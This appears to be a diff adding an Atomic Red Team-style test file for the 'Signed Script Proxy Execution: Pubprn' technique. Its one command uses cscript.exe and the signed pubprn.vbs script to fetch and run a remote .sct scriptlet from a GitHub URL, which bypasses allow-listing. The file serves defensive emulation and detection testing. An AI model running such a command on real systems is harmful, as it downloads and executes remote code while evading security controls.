@@ -1,0 +1,7 @@
+#TechniqueName: Signed Script Proxy Execution: Pubprn
+#AtomicTestName: PubPrn.vbs Signed Script Bypass
+#Language: cmd
+
+#commands
+cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct"
+
